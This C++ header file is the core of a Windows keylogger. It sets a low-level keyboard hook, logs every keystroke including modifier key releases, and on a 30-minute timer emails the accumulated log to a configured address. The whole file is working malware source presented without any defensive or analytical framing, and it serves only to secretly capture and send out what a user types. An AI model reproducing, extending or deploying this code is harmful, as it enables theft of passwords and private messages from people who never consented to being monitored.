#pragma once
#include <iostream>
#include <fstream>
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

std::string keylog = "";

void TimerSendMail()
{
	if (keylog.empty())
		return;
	std::string last_file = IO::WriteLog(keylog);
	if (last_file.empty())
	{
		Helper::WriteAppLog("File creation was not successfull. Keylog '" + keylog + "'");
		return;
	}
	int x = SMail::SendMail(
		"Log [" + last_file + "]",
		"Hi :)\nThe file has been attached to this mail.\n\n" + keylog);
	if (x != 7)
		Helper::WriteAppLog("Mail was not send! Error code: " + Helper::ToString(x));
	else
		keylog = "";
}

Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite);

HHOOK eHook = NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
	if (nCode < 0)
		CallNextHookEx(eHook, nCode, wparam, lparam);
	KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT*)lparam;
	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
	{
		keylog += Keys::keys[kbs->vkCode].name;
		if (kbs->vkCode == VK_RETURN)
			keylog += '\n';
	}
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
	{
		DWORD key = kbs->vkCode;
		if (key == VK_CONTROL
			|| key == VK_LCONTROL
			|| key == VK_RCONTROL
			|| key == VK_SHIFT
			|| key == VK_RSHIFT
			|| key == VK_MENU
			|| key == VK_LMENU
			|| key == VK_RMENU
			|| key == VK_CAPITAL
			|| key == VK_NUMLOCK
			|| key == VK_LWIN
			|| key == VK_RWIN)
		{
			std::string key_name = Keys::keys[kbs->vkCode].name;
			key_name.insert(1, "/");
			keylog += key_name;
		}
	}
	return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool InstallHook()
{
	Helper::WriteAppLog("Hook started... Timer started");
	MailTimer.Start(true);
	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,
		GetModuleHandle(NULL), 0);
	return eHook == NULL;
}

bool UninstallHook()
{
	BOOL b = UnhookWindowsHookEx(eHook);
	eHook = NULL;
	return static_cast<bool>(b);
}

bool IsHooked()
{
	return static_cast<bool>(eHook == NULL);
}